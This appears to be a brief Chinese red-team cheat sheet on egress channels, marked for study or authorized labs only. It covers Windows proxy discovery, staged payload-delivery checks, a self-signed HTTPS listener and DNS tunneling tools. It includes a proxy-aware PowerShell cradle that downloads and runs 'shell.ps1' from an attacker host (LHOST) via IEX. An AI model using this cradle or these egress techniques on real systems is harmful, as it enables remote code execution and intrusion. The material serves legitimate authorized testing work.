# 出网通道

::: warning 仅供学习 / 授权实验
所有阶段走同一张路径卡片：地址、端口、协议、代理。
:::

## 用户 vs SYSTEM 代理

```cmd
netsh winhttp show proxy
netsh winhttp import proxy source=ie
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

```powershell
[System.Net.WebRequest]::DefaultWebProxy
$w = New-Object System.Net.WebClient
$w.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$w.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
IEX $w.DownloadString('http://LHOST/shell.ps1')
```

改 WinHTTP 影响整机，用完：

```cmd
netsh winhttp reset proxy
```

## 分阶段验证

1. 无害 `curl http://LHOST/worked`  
2. 投递日志有没有第二阶段 GET  
3. 监听有没有会话  

有 GET 无会话 → 内容/位数/回连地址。无 GET → 出网或 URL。

## HTTPS 自签

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj "/CN=lab"
openssl x509 -in cert.pem -noout -fingerprint -sha256
# python
openssl s_server -accept 443 -cert cert.pem -key key.pem -WWW
```

握手失败先对指纹，再怀疑载荷。

## DNS（仅实验规则允许时）

公开工具：dnscat2、iodine。流量特征明显。本页不放自定义 C2 协议实现。

```bash
# 目标能 UDP 53 时，用公开客户端；NS 必须指向你的实验机
```
